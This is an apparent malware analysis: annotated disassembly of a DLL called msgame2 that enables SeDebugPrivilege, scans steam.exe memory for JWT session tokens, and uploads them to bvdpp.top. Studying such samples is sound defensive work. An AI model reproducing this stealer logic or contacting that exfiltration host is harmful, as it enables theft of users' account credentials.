0x0019bf  test        eax,eax
0x0019c1  je          0000000180001A49
0x0019c7  cmp         dword ptr [rax+rbp+0Ch],0
0x0019cc  lea         r14,[rax+rbp]
0x0019d0  je          0000000180001A49
0x0019d2  mov         ecx,dword ptr [r14+0Ch]
0x0019d6  add         rcx,rbp
0x0019d9  call        qword ptr [0000000180016058h] ; KERNEL32.dll!LoadLibraryA
0x0019df  mov         rsi,rax
0x0019e2  test        rax,rax
0x0019e5  je          0000000180001B09
0x0019eb  mov         eax,dword ptr [r14]
0x0019ee  mov         edi,dword ptr [r14+10h]
0x0019f2  add         rdi,rbp
0x0019f5  lea         rbx,[rax+rbp]
0x0019f9  test        eax,eax
0x0019fb  jne         0000000180001A00
0x0019fd  mov         rbx,rdi
0x001a00  mov         rax,qword ptr [rbx]
0x001a03  test        rax,rax
0x001a06  je          0000000180001A3E
0x001a08  mov         rcx,rsi
0x001a0b  test        rax,rax
0x001a0e  jns         0000000180001A15
0x001a10  movzx       edx,ax
0x001a13  jmp         0000000180001A1C
0x001a15  lea         rdx,[rbp+2]
0x001a19  add         rdx,rax
0x001a1c  call        qword ptr [0000000180016050h] ; KERNEL32.dll!GetProcAddress
0x001a22  test        rax,rax
0x001a25  je          0000000180001B09
0x001a2b  add         rbx,8
0x001a2f  mov         qword ptr [rdi],rax
0x001a32  add         rdi,8
0x001a36  mov         rax,qword ptr [rbx]
0x001a39  test        rax,rax
0x001a3c  jne         0000000180001A08
0x001a3e  add         r14,14h
0x001a42  cmp         dword ptr [r14+0Ch],0
0x001a47  jne         00000001800019D2
0x001a49  movzx       edi,word ptr [r13+14h]
0x001a4e  xor         ebx,ebx
0x001a50  add         rdi,r13
0x001a53  xor         eax,eax
0x001a55  cmp         ax,word ptr [r13+6]
0x001a5a  jae         0000000180001AC5
0x001a5c  nop         dword ptr [rax]
0x001a60  lea         rcx,[rbx+rbx*4]
0x001a64  lea         r9,[rcx*8+0000000000000000h]
0x001a6c  mov         edx,dword ptr [r9+rdi+20h]
0x001a71  test        rdx,rdx
0x001a74  jne         0000000180001A80
0x001a76  mov         edx,dword ptr [r9+rdi+28h]
0x001a7b  test        rdx,rdx
0x001a7e  je          0000000180001ABA
0x001a80  mov         r8d,dword ptr [r9+rdi+3Ch]
0x001a85  mov         ecx,dword ptr [r9+rdi+24h]
0x001a8a  sar         r8d,1Fh
0x001a8e  mov         eax,r8d
0x001a91  and         r8d,2
0x001a95  and         eax,20h
0x001a98  add         r8d,2
0x001a9c  add         eax,20h
0x001a9f  test        dword ptr [r9+rdi+3Ch],20000000h
0x001aa8  lea         r9,[rsp+60h]
0x001aad  cmovne      r8d,eax
0x001ab1  add         rcx,rbp
0x001ab4  call        qword ptr [0000000180016030h] ; KERNEL32.dll!VirtualProtect
0x001aba  movzx       eax,word ptr [r13+6]
0x001abf  inc         ebx
0x001ac1  cmp         ebx,eax
0x001ac3  jb          0000000180001A60
0x001ac5  mov         ecx,dword ptr [r13+28h]
0x001ac9  test        ecx,ecx
0x001acb  je          0000000180001AE3
0x001acd  lea         r9,[rcx+rbp]
0x001ad1  xor         r8d,r8d
0x001ad4  mov         rcx,rbp
0x001ad7  mov         edx,1
0x001adc  call        r9
0x001adf  test        eax,eax
```

```asm
; msgame2 ordinal_1 -> main
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x001000  jmp         0000000180004850
0x001005  int         3
0x001006  int         3
0x001007  int         3
0x001008  int         3
0x001009  int         3
0x00100a  int         3
0x00100b  int         3
0x00100c  int         3
0x00100d  int         3
0x00100e  int         3
0x00100f  int         3
0x001010  sub         rsp,28h
0x001014  cmp         edx,1
0x001017  jne         000000018000101E
0x001019  call        00000001800045B0
0x00101e  mov         eax,1
0x001023  add         rsp,28h
0x001027  ret
0x001028  int         3
0x001029  int         3
0x00102a  int         3
0x00102b  int         3
0x00102c  int         3
0x00102d  int         3
0x00102e  int         3
0x00102f  int         3
0x001030  lea         rax,[00000001800411B8h]
0x001037  ret
0x001038  int         3
0x001039  int         3
0x00103a  int         3
0x00103b  int         3
0x00103c  int         3
0x00103d  int         3
0x00103e  int         3
0x00103f  int         3
0x001040  lea         rax,[00000001800411B0h]
0x001047  ret
0x001048  int         3
0x001049  int         3
0x00104a  int         3
0x00104b  int         3
0x00104c  int         3
0x00104d  int         3
0x00104e  int         3
0x00104f  int         3
0x001050  mov         qword ptr [rsp+20h],r9
0x001055  push        rbx
0x001056  push        rbp
0x001057  push        rsi
0x001058  push        rdi
0x001059  push        r14
0x00105b  sub         rsp,40h
0x00105f  mov         rbp,r9
0x001062  lea         r14,[rsp+0000000000000090h]
0x00106a  mov         rbx,r8
0x00106d  mov         rdi,rdx
0x001070  mov         rsi,rcx
0x001073  call        0000000180001030
0x001078  mov         qword ptr [rsp+30h],r14
0x00107d  mov         r9,rbx
0x001080  mov         qword ptr [rsp+28h],0
0x001089  mov         r8,rdi
0x00108c  mov         rdx,rsi
0x00108f  mov         qword ptr [rsp+20h],rbp
0x001094  mov         rcx,qword ptr [rax]
0x001097  call        0000000180010BA4
0x00109c  test        eax,eax
0x00109e  mov         ecx,0FFFFFFFFh
0x0010a3  cmovs       eax,ecx
0x0010a6  add         rsp,40h
0x0010aa  pop         r14
0x0010ac  pop         rdi
0x0010ad  pop         rsi
0x0010ae  pop         rbp
0x0010af  pop         rbx
0x0010b0  ret
0x0010b1  int         3
0x0010b2  int         3
0x0010b3  int         3
0x0010b4  int         3
0x0010b5  int         3
0x0010b6  int         3
0x0010b7  int         3
0x0010b8  int         3
0x0010b9  int         3
0x0010ba  int         3
0x0010bb  int         3
0x0010bc  int         3
0x0010bd  int         3
0x0010be  int         3
0x0010bf  int         3
0x0010c0  mov         qword ptr [rsp+20h],r9
0x0010c5  push        rbx
0x0010c6  push        rbp
0x0010c7  push        rsi
0x0010c8  push        rdi
0x0010c9  push        r14
0x0010cb  sub         rsp,40h
0x0010cf  mov         rbp,r9
0x0010d2  lea         r14,[rsp+0000000000000090h]
0x0010da  mov         rbx,r8
0x0010dd  mov         rdi,rdx
0x0010e0  mov         rsi,rcx
0x0010e3  call        0000000180001030
0x0010e8  mov         qword ptr [rsp+30h],r14
0x0010ed  mov         r9,rbx
0x0010f0  mov         qword ptr [rsp+28h],0
0x0010f9  mov         r8,rdi
0x0010fc  mov         rdx,rsi
0x0010ff  mov         qword ptr [rsp+20h],rbp
0x001104  mov         rcx,qword ptr [rax]
0x001107  call        0000000180010D68
0x00110c  test        eax,eax
0x00110e  mov         ecx,0FFFFFFFFh
0x001113  cmovs       eax,ecx
0x001116  add         rsp,40h
0x00111a  pop         r14
0x00111c  pop         rdi
0x00111d  pop         rsi
0x00111e  pop         rbp
0x00111f  pop         rbx
```

```asm
; msgame2 main (选项/权限/扫描/上传)
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x004850  mov         qword ptr [rsp+8],rbx
0x004855  push        rbp
0x004856  lea         rbp,[rsp+FFFFFFFFFFFFDF60h]
0x00485e  mov         eax,21A0h
0x004863  call        0000000180006C20
0x004868  sub         rsp,rax
0x00486b  mov         rax,qword ptr [0000000180038180h]
0x004872  xor         rax,rsp
0x004875  mov         qword ptr [rbp+0000000000002090h],rax
0x00487c  lea         rcx,[000000018002BDB8h] ; 'PX_BRIDGE_TEST'
0x004883  call        000000018000B4F0
0x004888  xor         r9d,r9d
0x00488b  lea         rdx,[0000000180001360h]
0x004892  xor         r8d,r8d
0x004895  lea         rcx,[00000001800401D8h]
0x00489c  mov         rbx,rax
0x00489f  call        qword ptr [0000000180029140h] ; KERNEL32.dll!InitOnceExecuteOnce
0x0048a5  test        rbx,rbx
0x0048a8  je          000000018000497C
0x0048ae  movzx       eax,byte ptr [rbx]
0x0048b1  test        al,al
0x0048b3  je          000000018000497C
0x0048b9  cmp         al,30h
0x0048bb  je          000000018000497C
0x0048c1  xor         ebx,ebx
0x0048c3  mov         ecx,0FFFFFFFFh
0x0048c8  mov         qword ptr [rsp+30h],rbx
0x0048cd  call        qword ptr [00000001800291B8h] ; KERNEL32.dll!AttachConsole
0x0048d3  test        eax,eax
0x0048d5  je          0000000180004983
0x0048db  mov         ecx,1
0x0048e0  call        000000018000B618
0x0048e5  mov         r9,rax
0x0048e8  lea         r8,[000000018002B1D4h]
0x0048ef  lea         rdx,[000000018002B1D8h] ; 'CONOUT$'
0x0048f6  lea         rcx,[rsp+30h]
0x0048fb  call        0000000180011278
0x004900  mov         ecx,2
0x004905  call        000000018000B618
0x00490a  mov         r9,rax
0x00490d  lea         r8,[000000018002B1D4h]
0x004914  lea         rdx,[000000018002B1D8h] ; 'CONOUT$'
0x00491b  lea         rcx,[rsp+30h]
0x004920  call        0000000180011278
0x004925  xor         ecx,ecx
0x004927  call        000000018000B618
0x00492c  mov         r9,rax
0x00492f  lea         r8,[000000018002B1E0h]
0x004936  lea         rdx,[000000018002B1E4h] ; 'CONIN$'
0x00493d  lea         rcx,[rsp+30h]
0x004942  call        0000000180011278
0x004947  mov         ecx,0FDE9h
0x00494c  call        qword ptr [00000001800291C8h] ; KERNEL32.dll!SetConsoleOutputCP
0x004952  mov         ecx,0FDE9h
0x004957  call        qword ptr [00000001800291C0h] ; KERNEL32.dll!SetConsoleCP
0x00495d  mov         ecx,1
0x004962  call        000000018000B618
0x004967  mov         rcx,rax
0x00496a  xor         r9d,r9d
0x00496d  xor         edx,edx
0x00496f  mov         r8d,4
0x004975  call        0000000180011C68
0x00497a  jmp         00000001800049D3
0x00497c  xor         ebx,ebx
0x00497e  mov         qword ptr [rsp+30h],rbx
0x004983  call        qword ptr [00000001800291B0h] ; KERNEL32.dll!FreeConsole
0x004989  mov         ecx,1
0x00498e  call        000000018000B618
0x004993  mov         r9,rax
0x004996  lea         r8,[000000018002B1D4h]
0x00499d  lea         rdx,[000000018002B1ECh] ; 'NUL'
0x0049a4  lea         rcx,[rsp+30h]
0x0049a9  call        0000000180011278
0x0049ae  mov         ecx,2
0x0049b3  call        000000018000B618
0x0049b8  mov         r9,rax
0x0049bb  lea         r8,[000000018002B1D4h]
0x0049c2  lea         rdx,[000000018002B1ECh] ; 'NUL'
0x0049c9  lea         rcx,[rsp+30h]
0x0049ce  call        0000000180011278
```

```asm
; msgame2 启用 SeDebugPrivilege
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x0049e6  call        qword ptr [0000000180029028h] ; ADVAPI32.dll!OpenProcessToken
0x0049ec  test        eax,eax
0x0049ee  je          0000000180004A4F
0x0049f0  lea         r8,[rsp+38h]
0x0049f5  xor         ecx,ecx
0x0049f7  lea         rdx,[000000018002B698h] ; 'SeDebugPrivilege'
0x0049fe  call        qword ptr [0000000180029008h] ; ADVAPI32.dll!LookupPrivilegeValueW
0x004a04  mov         rcx,qword ptr [rsp+30h]
0x004a09  test        eax,eax
0x004a0b  je          0000000180004A49
0x004a0d  mov         rax,qword ptr [rsp+38h]
0x004a12  lea         r8,[rsp+40h]
0x004a17  mov         qword ptr [rsp+28h],rbx
0x004a1c  mov         r9d,10h
0x004a22  xor         edx,edx
0x004a24  mov         qword ptr [rsp+44h],rax
0x004a29  mov         dword ptr [rsp+40h],1
0x004a31  mov         dword ptr [rsp+4Ch],2
0x004a39  mov         qword ptr [rsp+20h],rbx
0x004a3e  call        qword ptr [0000000180029000h] ; ADVAPI32.dll!AdjustTokenPrivileges
0x004a44  mov         rcx,qword ptr [rsp+30h]
0x004a49  call        qword ptr [0000000180029108h] ; KERNEL32.dll!CloseHandle
0x004a4f  xorps       xmm0,xmm0
0x004a52  lea         rcx,[rbp+0000000000000090h]
0x004a59  xor         edx,edx
0x004a5b  mov         r8d,2000h
0x004a61  movups      xmmword ptr [rsp+50h],xmm0
0x004a66  movups      xmmword ptr [rsp+60h],xmm0
0x004a6b  movups      xmmword ptr [rsp+70h],xmm0
0x004a70  movups      xmmword ptr [rbp-80h],xmm0
0x004a74  call        00000001800273C0
0x004a79  mov         r9d,2000h
0x004a7f  lea         r8,[rbp+0000000000000090h]
```

```asm
; msgame2 scan_steam_memory (入口/调用)
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x004a90  call        0000000180005440
0x004a95  cmp         byte ptr [rbp+0000000000000090h],0
0x004a9c  lea         rdx,[000000018002B15Ch] ; 'yes'
0x004aa3  lea         rcx,[000000018002B160h]
0x004aaa  mov         r8,0FFFFFFFFFFFFFFFFh
0x004ab1  mov         rax,rcx
0x004ab4  lea         r9,[000000018002BDC8h] ; 'sidecar mem sid=%s jwt=%s'
0x004abb  cmovne      rax,rdx
0x004abf  cmp         byte ptr [rsp+50h],0
0x004ac4  mov         qword ptr [rsp+28h],rax
0x004ac9  cmovne      rcx,rdx
0x004acd  mov         edx,100h
0x004ad2  mov         qword ptr [rsp+20h],rcx
0x004ad7  lea         rcx,[rbp-70h]
0x004adb  call        0000000180001050
0x004ae0  lea         rcx,[rbp-70h]
0x004ae4  call        0000000180003F90
0x004ae9  cmp         byte ptr [rbp+0000000000000090h],0
0x004af0  lea         rdx,[rbp+0000000000000090h]
0x004af7  lea         rcx,[rsp+50h]
0x004afc  cmove       rdx,rbx
0x004b00  cmp         byte ptr [rsp+50h],0
0x004b05  cmove       rcx,rbx
0x004b09  xor         r8d,r8d
0x004b0c  call        0000000180006190
0x004b11  cmp         byte ptr [rbp+0000000000000090h],0
0x004b18  je          0000000180004B46
0x004b1a  mov         eax,dword ptr [0000000180038170h]
0x004b20  lea         r9,[000000018002BDE8h] ; 'sidecar jwt upload rc=%d'
0x004b27  mov         edx,100h
0x004b2c  mov         dword ptr [rsp+20h],eax
0x004b30  mov         r8,0FFFFFFFFFFFFFFFFh
0x004b37  lea         rcx,[rbp-70h]
0x004b3b  call        0000000180001050
0x004b40  lea         rcx,[rbp-70h]
0x004b44  jmp         0000000180004B4D
0x004b46  lea         rcx,[000000018002BE08h] ; 'sidecar jwt upload skip'
0x004b4d  call        0000000180003F90
0x004b52  mov         eax,dword ptr [00000001800405E8h]
0x004b58  lea         r9,[000000018002BE20h] ; 'sidecar loc upload rc=%d/%d'
0x004b5f  mov         dword ptr [rsp+28h],eax
0x004b63  lea         rcx,[rbp-70h]
0x004b67  mov         eax,dword ptr [00000001800405E4h]
0x004b6d  mov         edx,100h
0x004b72  mov         r8,0FFFFFFFFFFFFFFFFh
0x004b79  mov         dword ptr [rsp+20h],eax
0x004b7d  call        0000000180001050
0x004b82  lea         rcx,[rbp-70h]
0x004b86  call        0000000180003F90
0x004b8b  lea         rcx,[000000018002BE40h] ; 'sidecar upload pass done'
0x004b92  call        0000000180003F90
0x004b97  lea         r9,[000000018002BE60h] ; 'sidecar exit rc=%u'
0x004b9e  mov         dword ptr [rsp+20h],ebx
```

```asm
; msgame2 内存扫描主体
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x005440  push        rbp
0x005442  push        rbx
0x005443  push        rsi
0x005444  push        rdi
0x005445  push        r14
0x005447  push        r15
0x005449  lea         rbp,[rsp+FFFFFFFFFFFFF9B8h]
0x005451  sub         rsp,748h
0x005458  mov         rax,qword ptr [0000000180038180h]
0x00545f  xor         rax,rsp
0x005462  mov         qword ptr [rbp+0000000000000630h],rax
0x005469  mov         qword ptr [rbp-80h],rdx
0x00546d  mov         rbx,rcx
0x005470  mov         qword ptr [rbp-78h],rcx
0x005474  xor         edx,edx
0x005476  mov         ecx,2
0x00547b  mov         qword ptr [rsp+70h],r9
0x005480  mov         rsi,r8
0x005483  mov         qword ptr [rsp+78h],r8
0x005488  call        0000000180006B61
0x00548d  mov         rdi,rax
0x005490  call        qword ptr [0000000180029170h] ; KERNEL32.dll!GetTickCount64
0x005496  mov         byte ptr [rbx],0
0x005499  xor         r15d,r15d
0x00549c  mov         byte ptr [rsi],0
0x00549f  mov         r14,rax
0x0054a2  mov         qword ptr [rsp+68h],rax
0x0054a7  lea         rsi,[0000000180029F10h] ; '6579416964486C77496A6F67496B70585643497349434A68624763694F6941695257524555304569494830'
0x0054ae  xor         ebx,ebx
0x0054b0  mov         dword ptr [0000000180038E14h],0
0x0054ba  mov         dword ptr [0000000180038E18h],0
0x0054c4  mov         dword ptr [0000000180038E1Ch],0
0x0054ce  nop
0x0054d0  cmp         r15,100h
0x0054d7  jae         0000000180005511
0x0054d9  lea         rcx,[rbx+rsi]
0x0054dd  lea         r8,[rsp+38h]
0x0054e2  lea         rdx,[000000018002B694h] ; '%2x'
0x0054e9  call        0000000180005C10
0x0054ee  cmp         eax,1
0x0054f1  jne         0000000180005503
0x0054f3  movzx       eax,byte ptr [rsp+38h]
0x0054f8  mov         byte ptr [rbp+r15+0000000000000530h],al
0x005500  inc         r15
0x005503  add         rbx,2
0x005507  lea         rax,[rbx+1]
0x00550b  cmp         rax,56h
0x00550f  jb          00000001800054D0
0x005511  mov         qword ptr [rsp+48h],r15
0x005516  test        r15,r15
0x005519  je          000000018000594C
0x00551f  cmp         rdi,0FFFFFFFFFFFFFFFFh
0x005523  je          000000018000594C
0x005529  xor         ebx,ebx
0x00552b  mov         dword ptr [rbp-10h],238h
0x005532  lea         rdx,[rbp-10h]
0x005536  mov         dword ptr [rsp+38h],ebx
0x00553a  mov         rcx,rdi
0x00553d  call        0000000180006B67
0x005542  test        eax,eax
0x005544  je          000000018000558C
0x005546  nop         word ptr [rax+rax+0000000000000000h]
0x005550  lea         rdx,[000000018002B148h] ; 'steam.exe'
0x005557  lea         rcx,[rbp+1Ch]
0x00555b  call        000000018000A3E0
0x005560  test        eax,eax
0x005562  jne         0000000180005578
0x005564  cmp         ebx,40h
0x005567  jge         0000000180005578
0x005569  mov         eax,dword ptr [rbp-8]
0x00556c  movsxd      rdx,ebx
0x00556f  inc         ebx
```

```asm
; msgame2 JWT 头部特征
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x0054a7  lea         rsi,[0000000180029F10h] ; '6579416964486C77496A6F67496B70585643497349434A68624763694F6941695257524555304569494830'
0x0054ae  xor         ebx,ebx
0x0054b0  mov         dword ptr [0000000180038E14h],0
0x0054ba  mov         dword ptr [0000000180038E18h],0
0x0054c4  mov         dword ptr [0000000180038E1Ch],0
0x0054ce  nop
0x0054d0  cmp         r15,100h
0x0054d7  jae         0000000180005511
0x0054d9  lea         rcx,[rbx+rsi]
0x0054dd  lea         r8,[rsp+38h]
0x0054e2  lea         rdx,[000000018002B694h] ; '%2x'
0x0054e9  call        0000000180005C10
0x0054ee  cmp         eax,1
0x0054f1  jne         0000000180005503
0x0054f3  movzx       eax,byte ptr [rsp+38h]
0x0054f8  mov         byte ptr [rbp+r15+0000000000000530h],al
0x005500  inc         r15
0x005503  add         rbx,2
0x005507  lea         rax,[rbx+1]
0x00550b  cmp         rax,56h
0x00550f  jb          00000001800054D0
0x005511  mov         qword ptr [rsp+48h],r15
0x005516  test        r15,r15
0x005519  je          000000018000594C
0x00551f  cmp         rdi,0FFFFFFFFFFFFFFFFh
0x005523  je          000000018000594C
0x005529  xor         ebx,ebx
0x00552b  mov         dword ptr [rbp-10h],238h
0x005532  lea         rdx,[rbp-10h]
0x005536  mov         dword ptr [rsp+38h],ebx
0x00553a  mov         rcx,rdi
0x00553d  call        0000000180006B67
0x005542  test        eax,eax
0x005544  je          000000018000558C
0x005546  nop         word ptr [rax+rax+0000000000000000h]
0x005550  lea         rdx,[000000018002B148h] ; 'steam.exe'
```

```asm
; msgame2 匹配 steam.exe / OpenProcess
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x005550  lea         rdx,[000000018002B148h] ; 'steam.exe'
0x005557  lea         rcx,[rbp+1Ch]
0x00555b  call        000000018000A3E0
0x005560  test        eax,eax
0x005562  jne         0000000180005578
0x005564  cmp         ebx,40h
0x005567  jge         0000000180005578
0x005569  mov         eax,dword ptr [rbp-8]
0x00556c  movsxd      rdx,ebx
0x00556f  inc         ebx
0x005571  mov         dword ptr [rbp+rdx*4+0000000000000230h],eax
0x005578  lea         rdx,[rbp-10h]
0x00557c  mov         rcx,rdi
0x00557f  call        0000000180006B6D
0x005584  test        eax,eax
0x005586  jne         0000000180005550
0x005588  mov         dword ptr [rsp+38h],ebx
0x00558c  mov         rcx,rdi
0x00558f  call        qword ptr [0000000180029108h] ; KERNEL32.dll!CloseHandle
0x005595  mov         dword ptr [0000000180038E14h],ebx
0x00559b  test        ebx,ebx
0x00559d  je          000000018000594C
0x0055a3  mov         ecx,2000h
0x0055a8  call        000000018000AEC0
0x0055ad  mov         qword ptr [rsp+58h],rax
0x0055b2  test        rax,rax
0x0055b5  je          000000018000594C
0x0055bb  xor         esi,esi
0x0055bd  xor         ecx,ecx
0x0055bf  mov         dword ptr [rsp+30h],esi
0x0055c3  mov         dword ptr [rsp+3Ch],ecx
0x0055c7  test        ebx,ebx
0x0055c9  jle         0000000180005940
0x0055cf  mov         qword ptr [rsp+0000000000000788h],r12
0x0055d7  mov         qword ptr [rsp+0000000000000740h],r13
0x0055df  nop
0x0055e0  test        esi,esi
0x0055e2  jne         000000018000592B
0x0055e8  mov         ebx,dword ptr [rbp+rcx*4+0000000000000230h]
0x0055ef  xor         edx,edx
0x0055f1  mov         r8d,ebx
0x0055f4  mov         ecx,410h
0x0055f9  call        qword ptr [0000000180029160h] ; KERNEL32.dll!OpenProcess
0x0055ff  mov         qword ptr [rsp+40h],rax
0x005604  mov         rdi,rax
0x005607  test        rax,rax
0x00560a  jne         000000018000562D
0x00560c  mov         r8d,ebx
0x00560f  xor         edx,edx
0x005611  mov         ecx,1010h
0x005616  call        qword ptr [0000000180029160h] ; KERNEL32.dll!OpenProcess
0x00561c  mov         qword ptr [rsp+40h],rax
0x005621  mov         rdi,rax
0x005624  test        rax,rax
0x005627  je          0000000180005917
0x00562d  inc         dword ptr [0000000180038E18h]
0x005633  xor         r13d,r13d
0x005636  xor         ebx,ebx
0x005638  xor         r12d,r12d
0x00563b  mov         dword ptr [rsp+34h],r12d
0x005640  call        qword ptr [0000000180029170h] ; KERNEL32.dll!GetTickCount64
0x005646  sub         rax,r14
0x005649  cmp         rax,0AFC8h
0x00564f  ja          000000018000577C
0x005655  mov         r9d,30h
0x00565b  lea         r8,[rbp-70h]
0x00565f  mov         rdx,rbx
```

```asm
; msgame2 ReadProcessMemory 调用点 1
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x0056da  call        qword ptr [0000000180029188h] ; KERNEL32.dll!ReadProcessMemory
0x0056e0  test        eax,eax
0x0056e2  je          0000000180005747
0x0056e4  mov         rsi,qword ptr [rsp+50h]
0x0056e9  cmp         rsi,r15
0x0056ec  jb          0000000180005747
0x0056ee  xor         ebx,ebx
0x0056f0  cmp         r15,rsi
0x0056f3  ja          0000000180005747
0x0056f5  mov         r15,qword ptr [rbp-70h]
0x0056f9  mov         r12,qword ptr [rsp+48h]
0x0056fe  nop
0x005700  cmp         r13d,40h
0x005704  jae         0000000180005738
0x005706  lea         rcx,[rbx+r14]
0x00570a  mov         r8,r12
0x00570d  lea         rdx,[rbp+0000000000000530h]
0x005714  call        0000000180026C10
0x005719  test        eax,eax
0x00571b  jne         000000018000572C
0x00571d  lea         rcx,[rbx+r15]
0x005721  mov         qword ptr [rbp+r13*8+0000000000000330h],rcx
0x005729  inc         r13d
0x00572c  inc         ebx
0x00572e  mov         eax,ebx
0x005730  add         rax,r12
0x005733  cmp         rax,rsi
0x005736  jbe         0000000180005700
0x005738  mov         r12d,dword ptr [rsp+34h]
```

```asm
; msgame2 ReadProcessMemory 调用点 2
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x00586c  call        qword ptr [0000000180029188h] ; KERNEL32.dll!ReadProcessMemory
0x005872  mov         rcx,qword ptr [rsp+60h]
0x005877  test        eax,eax
0x005879  jne         0000000180005880
0x00587b  test        rcx,rcx
0x00587e  je          0000000180005895
0x005880  add         rsi,rcx
0x005883  cmp         rcx,rbx
0x005886  jb          0000000180005895
0x005888  cmp         rsi,2000h
0x00588f  jb          00000001800057D0
0x005895  mov         r15d,dword ptr [rsp+34h]
0x00589a  mov         qword ptr [rsp+50h],rsi
0x00589f  cmp         rsi,40h
0x0058a3  jb          00000001800058ED
0x0058a5  mov         rax,qword ptr [rsp+70h]
0x0058aa  mov         rdx,rsi
0x0058ad  mov         r14,qword ptr [rbp-78h]
0x0058b1  mov         r9,qword ptr [rbp-80h]
0x0058b5  mov         r8,r14
0x0058b8  mov         rcx,qword ptr [rsp+58h]
0x0058bd  mov         qword ptr [rsp+28h],rax
0x0058c2  mov         rax,qword ptr [rsp+78h]
0x0058c7  mov         qword ptr [rsp+20h],rax
```

```asm
; msgame2 upload_all (内存结果 /vdf 分支)
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x006190  mov         r11,rsp
0x006193  push        rbx
0x006194  push        r12
0x006196  sub         rsp,198h
0x00619d  mov         rax,qword ptr [0000000180038180h]
0x0061a4  xor         rax,rsp
0x0061a7  mov         qword ptr [rsp+0000000000000160h],rax
0x0061af  mov         qword ptr [r11-18h],rsi
0x0061b3  xorps       xmm0,xmm0
0x0061b6  mov         qword ptr [r11-20h],rdi
0x0061ba  xor         r12d,r12d
0x0061bd  mov         qword ptr [r11-30h],r14
0x0061c1  mov         rsi,r8
0x0061c4  mov         qword ptr [r11-38h],r15
0x0061c8  mov         rbx,rdx
0x0061cb  mov         rdi,rcx
0x0061ce  movups      xmmword ptr [rsp+30h],xmm0
0x0061d3  movups      xmmword ptr [rsp+40h],xmm0
0x0061d8  test        rcx,rcx
0x0061db  je          000000018000623A
0x0061dd  test        rdx,rdx
0x0061e0  je          000000018000623A
0x0061e2  cmp         byte ptr [rcx],r12b
0x0061e5  je          000000018000623A
0x0061e7  cmp         byte ptr [rdx],r12b
0x0061ea  je          000000018000623A
0x0061ec  lea         rcx,[000000018002BB18h]
0x0061f3  call        0000000180003E90
0x0061f8  lea         rax,[00000001800295C8h]
0x0061ff  mov         edx,1BBh
0x006204  mov         qword ptr [rsp+28h],rax
0x006209  lea         r8,[0000000180029520h] ; '/ey/2.php'
0x006210  mov         r9,rdi
0x006213  mov         qword ptr [rsp+20h],rbx
0x006218  lea         rcx,[00000001800294C0h] ; 'bvdpp.top'
0x00621f  call        00000001800064B0
0x006224  test        eax,eax
0x006226  lea         rdx,[000000018002BB40h]
0x00622d  lea         rcx,[000000018002BB58h]
0x006234  cmovne      rcx,rdx
0x006238  jmp         0000000180006244
0x00623a  lea         rcx,[000000018002BB70h]
0x006241  mov         eax,r12d
0x006244  mov         dword ptr [0000000180038170h],eax
0x00624a  call        0000000180003E90
0x00624f  lea         rcx,[000000018002BB98h]
0x006256  call        0000000180003E90
0x00625b  test        rsi,rsi
0x00625e  je          000000018000626D
0x006260  mov         rcx,rsi
0x006263  mov         r15d,r12d
0x006266  call        00000001800032D0
0x00626b  jmp         0000000180006278
0x00626d  lea         rsi,[rsp+30h]
0x006272  mov         r15d,1
0x006278  mov         rcx,rsi
0x00627b  call        0000000180001530
0x006280  mov         r14,qword ptr [rsi+10h]
0x006284  mov         qword ptr [rsp+50h],r14
0x006289  test        r14,r14
0x00628c  jne         00000001800062AD
0x00628e  lea         rcx,[000000018002BBC8h]
0x006295  mov         dword ptr [00000001800405E4h],r12d
0x00629c  mov         dword ptr [00000001800405E8h],r12d
0x0062a3  call        0000000180003E90
0x0062a8  jmp         0000000180006416
0x0062ad  mov         qword ptr [rsp+00000000000001C8h],rbp
0x0062b5  lea         rcx,[000000018002BBF0h]
0x0062bc  mov         ebp,r12d
0x0062bf  call        0000000180003E90
0x0062c4  lea         rcx,[000000018002BC10h]
0x0062cb  call        0000000180003E90
0x0062d0  mov         rax,qword ptr [rsi+10h]
0x0062d4  test        rax,rax
0x0062d7  je          00000001800063CB
0x0062dd  mov         qword ptr [rsp+0000000000000180h],r13
0x0062e5  lea         r14,[000000018002BC64h]
0x0062ec  mov         r13,r12
0x0062ef  lea         r12,[00000001800295E0h]
0x0062f6  nop         word ptr [rax+rax+0000000000000000h]
0x006300  mov         r9,qword ptr [rsi]
0x006303  lea         rdi,[r13+1]
0x006307  mov         qword ptr [rsp+28h],rax
0x00630c  lea         r8,[000000018002BC40h] ; '[VDF] upload uid=%s (%zu/%zu) ...'
0x006313  mov         edx,100h
0x006318  mov         qword ptr [rsp+20h],rdi
0x00631d  lea         rcx,[rsp+60h]
0x006322  mov         r9,qword ptr [r9+r13*8]
0x006326  call        00000001800059A0
0x00632b  lea         rcx,[rsp+60h]
0x006330  call        0000000180003E90
0x006335  mov         rax,qword ptr [rsi+8]
0x006339  lea         r8,[0000000180029538h] ; '/vdf/2.php'
0x006340  mov         r9,qword ptr [rsi]
0x006343  lea         rcx,[00000001800294C0h] ; 'bvdpp.top'
0x00634a  mov         edx,1BBh
0x00634f  mov         qword ptr [rsp+28h],r12
0x006354  mov         rax,qword ptr [rax+r13*8]
0x006358  mov         r9,qword ptr [r9+r13*8]
0x00635c  mov         qword ptr [rsp+20h],rax
0x006361  call        00000001800064B0
0x006366  mov         r9,qword ptr [rsi]
0x006369  lea         rcx,[000000018002BC68h] ; 'FAIL'
0x006370  test        eax,eax
0x006372  lea         r8,[000000018002BC70h] ; '[VDF] upload uid=%s %s'
0x006379  mov         edx,100h
0x00637e  mov         ebx,eax
0x006380  cmovne      rcx,r14
0x006384  mov         r9,qword ptr [r9+r13*8]
0x006388  mov         qword ptr [rsp+20h],rcx
0x00638d  lea         rcx,[rsp+60h]
0x006392  call        00000001800059A0
0x006397  lea         rcx,[rsp+60h]
0x00639c  call        0000000180003E90
0x0063a1  lea         eax,[rbp+1]
